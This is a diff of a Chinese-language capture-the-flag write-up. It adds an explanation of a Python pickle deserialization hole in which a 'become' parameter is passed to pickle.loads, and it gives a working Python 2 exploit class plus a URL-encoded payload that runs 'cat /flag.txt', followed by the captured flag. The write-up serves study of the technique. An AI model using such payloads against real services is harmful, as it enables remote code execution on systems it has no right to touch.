@@ -21,7 +21,7 @@
 这个是什么?EKanEhgLeJTKhBdqMwevWIenptkDoUPlQxvXesLuUkeQbuPWwAPaDMZoRdHFbSTpaHzDxCrhXgORrIYWUDcGvQDCjyEJsywuhsBA
 先不管
 写脚本跑出v6
-import requests
+```import requests
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
 
@@ -47,7 +47,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-
+```
 
 ![图片](https://github.com/user-attachments/assets/7f698e04-dd82-4de8-aa4f-4bbff2a2b055)
 
@@ -105,8 +105,31 @@ v6啥也没有啊
 ![图片](https://github.com/user-attachments/assets/55cb2a64-f516-4329-aba2-bf2e37eed493)
  p = pickle.loads(urllib.unquote(become))
  
+Pickle 反序列化漏洞
+Ref. https://xz.aliyun.com/t/14061?time__1311=GqAxuDRD0iwxlEzG7Dy7YDkKYnjxWTKpD
 
+这里位置是
+become = self.get_argument('become')
+p = pickle.loads(urllib.unquote(become))
+become 然后url解码
 
+            
+因为库的问题卡了我好久py3的subprocess库转出来的payload不对
+```import pickle
+import urllib
+import commands  # Python 2 only
 
+class payload(object):
+    def __reduce__(self):
+        #ls /
+        return (commands.getoutput, ("cat /flag.txt",))  # Using commands.getoutput to execute the command
 
+a = pickle.dumps(payload())
+a = urllib.quote(a)  # In Python 2, use urllib.quote
+print(a)
+```
+#ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.
+![图片](https://github.com/user-attachments/assets/89cb2931-76ae-40c8-affa-62d4e963c950)
 
+# flag{dfe54e6fe1e34f1e8fb03c8b50e963bd}
+![图片](https://github.com/user-attachments/assets/729aa913-f82c-4613-9197-ea30e4fad373)
